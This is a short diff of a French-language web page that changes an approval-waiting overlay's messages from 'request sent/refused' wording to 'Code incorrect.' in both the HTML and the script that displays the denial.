@@ -385,8 +385,8 @@
     <div class="error-icon" id="errorIcon" aria-hidden="true">!</div>
     <div class="spinner" id="spinner"></div>
     <h2 id="overlayTitle">En attente d'approbation</h2>
-    <p id="overlayText">Votre demande a été envoyée. Merci de patienter pendant la vérification…</p>
-    <p class="denied-msg" id="deniedMsg">Votre demande a été refusée.</p>
+    <p id="overlayText">Code incorrect. Merci de patienter pendant la vérification…</p>
+    <p class="denied-msg" id="deniedMsg">Code incorrect.</p>
     <button class="retry-btn" id="retryBtn">RÉESSAYER</button>
   </div>
 
@@ -470,7 +470,7 @@
           spinner.style.display = 'none';
           overlayTitle.style.display = 'none';
           overlayText.style.display = 'none';
-          deniedMsg.textContent = 'Votre demande a été refusée.';
+          deniedMsg.textContent = 'Code incorrect.';
           deniedMsg.style.display = 'block';
           retryBtn.style.display = 'inline-block';
         } else if(data.status === 'insufficient'){
